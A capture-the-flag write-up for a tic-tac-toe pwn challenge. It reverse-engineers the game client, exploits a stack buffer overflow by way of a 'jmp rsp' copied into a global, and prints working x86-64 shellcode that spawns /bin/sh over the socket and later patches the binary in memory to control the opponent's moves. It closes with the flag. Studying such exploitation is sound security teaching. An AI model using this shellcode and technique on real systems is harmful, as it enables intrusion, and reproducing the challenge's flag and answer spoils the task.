### TicTacToe #pwn

#### inputs 

- `tictactoe ` - ELF 64-bit LSB executable, x86-64 (game frontend) 
- `server.py` - server code (game backend)

#### recon

After connecting to provided host we can see implementation of tic tac toe game:

```console
$ nc pwn-tictactoe.ctfz.one 8889
Welcome to tictactoe game! Please, enter your name: elkle%po
                                                                     
+---+---+---+    Session: emdBER4MYfNbqYJZzxyn9StjbFvP1OdS           
|   |   |   |                                                        
| X |   |   |     Player: elkle%po                                        
|  1|  2|  3|                                                        
|---+---+---|      Level: 1/100                                      
|   |   |   |                                                        
|   |   |   |      Rules: You play with 0s. Now it's your turn.      
|  4|  5|  6|             Enter number 1-9 to make your move.        
|---+---+---|             In order to get the flag you need to win   
|   |   |   |             100 times in a row, buy your enemy is a    
|   |   |   |             really smart AI. Good luck!                
|  7|  8|  9|                                                        
+---+---+---+      Enter your move (1-9):
```

So we have to win 100 games to get the flag. After some manual tries I was not able to win a single game (no surprise here - it's `pwn` task :) ).

Next, I jumped to server code analysis and reverse engineering (symbols were not stripped so it was quite easy). That's how, in simplified way, the game infrastructure works:

```
+-------------------------------player------+
|                                           |
+-------------------------------------------+
  |                    ^
  |                    | board state
  | human_move         | [next/win/lose/flag]
  |                    |
  v                    |
+-------------------------------tictactoe---+
| board_state                               |
+-------------------------------------------+
  |                    ^
  | session_x_id       | [next/win/lose/flag]
  | human move         | board state
  | computer move      |
  v                    |
+-------------------------------server.py---+
| +-session_x----+                          |
| | games won    |                          |
| | board state  |                          |
| +--------------+                          |
+-------------------------------------------+

```

`tictactoe` gets human move and computes computer move basing on board state after human move.

Both human move and computer move are sent to `server.py` (most probably on different machine) which is responsible for moves validation, win/lose decision and informing `tictactoe` that user won 100 games and the flag is available.

When flag availability is signaled, `tictactoe` is sending "get flag" request to `server.py` which sends flag back if 100 games were won (for simplicity - this call is omitted on above diagram).

It is impossible for user to communicate to `server.py` directly so we have to exploit `tictactoe`.

#### tictactoe exploitation

 ```console
$ checksec --file ./tictactoe
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
 ```

Ok, so there are literally no exploit mitigations in `tictactoe`, that would make things much easier.

My initial idea was to get remote shell and execute my "malicious" version of `tictactoe` written in python or just simply redirect crafted input to `nc`.

There is a pretty big buffer overflow in `get_name()` function:

```c
int get_name()
{
	...
  	char tmp_name[16];
  	...
  	// recv up to 2048 bytes from socket and store them in `tmp_name`
	recv_session_count = recv_all(psock, tmp_name, 2048);
	...
	// `name` is a global variable at fixed address.
	strcpy(name, tmp_name);
	...
}
```

We can control function return address, but there is no obvious "instant win" location. 

We're not able to leak any memory (at this point) so there is no option to leak `libc` address and use its code for ROP.

But there is RWX stack. We may provide 2048 bytes of shellcode, but it is required to find an option to redirect execution to it. Unfortunately, due to ASLR, it is not possible (without lucky guess) to set return address to `tmp_name`. 

We have to find the gadget like: `push rsp; ret`, `jmp rsp` or something similar, but unfortunately `tictactoe` does not contain such gadgets.

Because `tictactoe` is not PIE executable, all global variables are always at fixed address and all RW sections are actually RWX sections during runtime. 

Looking at `get_name()` code we can see an opportunity - `tmp_name` is copied to global variable `name`. The idea to get remote code execution is to send following payload:

 `asm('jmp rsp') + padding + 'name' address + shellcode`

Which will cause `jump rsp` opcode to be copied under `name` address and function return address will be overwritten with `name` address. During `get_name()` stack unwinding, `ret` function will set `rip` to `name` address, executing `jump rsp` afterwards and `rip` will point to executable stack with our shellcode.

Using this method I was able to execute shellcode:

```assembly
mov r13, [0x0405720] # `psock` address
mov rdi, r13
mov rsi, 0
mov rax, 33
syscall     # dup2(psock, stdin)

mov rdi, r13
mov rsi, 1
mov rax, 33
syscall     # dup2(psock, stdout)

mov rdi, r13
mov rsi, 2
mov rax, 33
syscall     # dup2(psock, stderr)

mov rdi, r13
mov rax, 3
syscall     # close(psock)

xor     rdx, rdx
mov     rbx, 0x68732f6e69622f2f
shr     rbx, 0x8
push    rbx
mov     rdi, rsp
push    rax
push    rdi
mov     rsi, rsp
mov     al, 0x3b
syscall     # execve("/bin/sh", ["/bin/sh"], NULL)
```

Success, I had remote shell!  But...

Unfortunately, the shell had extremely limited functionalities and I had no idea on how to execute my python code there or transfer and execute other binaries. There was no `python`, `nc`, `base64` or any other "standard" tools. I know that it was possible for some bash magicians, but I'm not one of them :(

I decided to take another approach, Let's look at `process_game_situation()` function:

```c
int __cdecl process_game_situation(char *board, int *comp_move, int *human_move)
{
    ...
	*comp_move = get_computer_move(board);
	...
    *human_move = get_human_move(board);
	...
}
```

What if we change its code to look as follows:

```c
int __cdecl process_game_situation(char *board, int *comp_move, int *human_move)
{
    ...
	*comp_move = get_human_move(board); // get_computer_move -> get_human_move
	...
    *human_move = get_human_move(board);
	...
}
```

We would be able to provide not only our moves, but also computer moves. I used remote code execution payload described earlier with following shellcode:

```assembly
mov rdi, 0x400000
mov rsi, 0x5000
mov rdx, 0x7
mov rax, 10
syscall     # mprotect(0x400000, 0x5000, 0x7[RWX])

mov BYTE PTR [0x401c86], 0xe8   # change:
mov BYTE PTR [0x401c87], 0x9f   # 0x401C86: call get_computer_move
mov BYTE PTR [0x401c88], 0xfd   # to
mov BYTE PTR [0x401c89], 0xff   # 0x401C86: call get_human_move
mov BYTE PTR [0x401c8a], 0xff   # offset calculation done manually

push 0x0401D32
ret         # return to process_game()
```

Worked as expected, I was able to provide both mine and computer moves. Winning 100 games witch such a cheat was pretty easy!

> ctfzone{h3r3_w3_g0_4g41n_t1c_t4c_t03_1z_4_n1z3_g4m3}

[exploit.py](./exploit.py) contains code for both remote shell (`gimme_shell()`) and flag exploit (`gimme_flag()`).